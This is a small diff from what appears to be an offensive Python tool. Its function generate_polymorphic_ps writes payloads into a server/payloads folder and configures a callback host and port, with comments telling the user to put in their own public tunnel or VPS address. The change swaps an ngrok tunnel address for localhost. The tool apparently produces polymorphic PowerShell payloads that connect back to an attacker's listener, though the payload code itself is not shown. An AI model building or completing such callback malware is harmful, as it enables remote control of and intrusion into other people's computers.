@@ -9,8 +9,8 @@ def rand_name(length=8):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 def generate_polymorphic_ps():
-    host = "4.tcp.us-cal-1.ngrok.io"  # Replace with your public tunnel or VPS IP
-    port = 13791                      # Replace with your forwarded/tunnel port
+    host = "localhost"  # Replace with your public tunnel or VPS IP
+    port = 1443                      # Replace with your forwarded/tunnel port
 
     folder = os.path.join("server", "payloads")
     os.makedirs(folder, exist_ok=True)
